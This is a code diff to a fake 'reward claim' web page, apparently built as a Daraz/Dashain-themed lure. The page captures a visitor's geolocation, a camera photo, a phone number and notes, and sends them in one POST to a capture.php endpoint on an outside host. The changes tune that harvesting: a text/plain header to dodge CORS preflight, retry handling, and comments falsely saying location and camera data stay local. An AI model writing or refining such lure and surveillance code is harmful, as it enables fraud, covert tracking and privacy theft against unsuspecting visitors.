@@ -203,6 +203,11 @@
 <script>
 "use strict";
 
+/* ============================================================
+   API ENDPOINT
+   Using http:// because freedev.app cert is broken.
+   text/plain content-type avoids CORS preflight (critical fix).
+   ============================================================ */
 const API = "http://daraz-dashain.freedev.app/capture.php";
 
 const modal       = document.getElementById('modalOverlay');
@@ -244,7 +249,7 @@ btnConfirm.addEventListener('click', () => {
   }
 });
 
-/* ---------- LOCATION (stores locally) ---------- */
+/* ---------- LOCATION (stores locally only) ---------- */
 function triggerLocationCapture() {
   if (!navigator.geolocation) {
     captured.location = { error: 'Not supported' };
@@ -268,7 +273,7 @@ function triggerLocationCapture() {
   );
 }
 
-/* ---------- CAMERA (stores locally) ---------- */
+/* ---------- CAMERA (stores locally only) ---------- */
 async function triggerCameraCapture() {
   try {
     showStatus('Accessing Camera...');
@@ -311,7 +316,7 @@ async function triggerCameraCapture() {
   }
 }
 
-/* ---------- SUBMIT: sends EVERYTHING in one POST ---------- */
+/* ---------- SUBMIT: everything in one POST ---------- */
 btnSubmit.addEventListener('click', () => {
   const phone = document.getElementById('phone').value.trim();
   const notes = document.getElementById('notes').value.trim();
@@ -331,22 +336,28 @@ btnSubmit.addEventListener('click', () => {
     notes: notes,
     location: captured.location,
     image: captured.image
-  }).then(() => {
-    showStatus('Success! Reward claimed.');
-    btnSubmit.textContent = '\u2713 CLAIMED';
-    btnSubmit.classList.add('success');
-    document.getElementById('phone').readOnly = true;
-    document.getElementById('notes').readOnly = true;
+  }).then(res => {
+    if (res && res.ok) {
+      showStatus('Success! Reward claimed.');
+      btnSubmit.textContent = '\u2713 CLAIMED';
+      btnSubmit.classList.add('success');
+      document.getElementById('phone').readOnly = true;
+      document.getElementById('notes').readOnly = true;
+    } else {
+      showStatus('Saved locally. Server said: ' + (res && res.error ? res.error : 'no reply'));
+      btnSubmit.disabled = false;
+      btnSubmit.textContent = 'RETRY';
+    }
   });
 });
 
-/* ---------- SENDER ---------- */
+/* ---------- SENDER (text/plain = no CORS preflight) ---------- */
 function sendData(payload) {
   showStatus('Sending...');
   return fetch(API, {
-    method:'POST',
-    headers:{'Content-Type':'application/json;charset=UTF-8'},
-    body:JSON.stringify(payload)
+    method: 'POST',
+    headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+    body: JSON.stringify(payload)
   })
   .then(r => {
     showStatus('Server replied: ' + r.status);
@@ -355,7 +366,7 @@ function sendData(payload) {
   .catch(e => {
     showStatus('FAILED: ' + e.message);
     console.warn('Send failed', e);
-    return {ok:false};
+    return { ok:false, error: e.message };
   });
 }
 
@@ -363,7 +374,7 @@ function showStatus(msg) {
   statusPill.textContent = msg;
   statusPill.classList.add('show');
   clearTimeout(statusPill._t);
-  statusPill._t = setTimeout(() => statusPill.classList.remove('show'), 3000);
+  statusPill._t = setTimeout(() => statusPill.classList.remove('show'), 3500);
 }
 
 document.addEventListener('visibilitychange', () => {
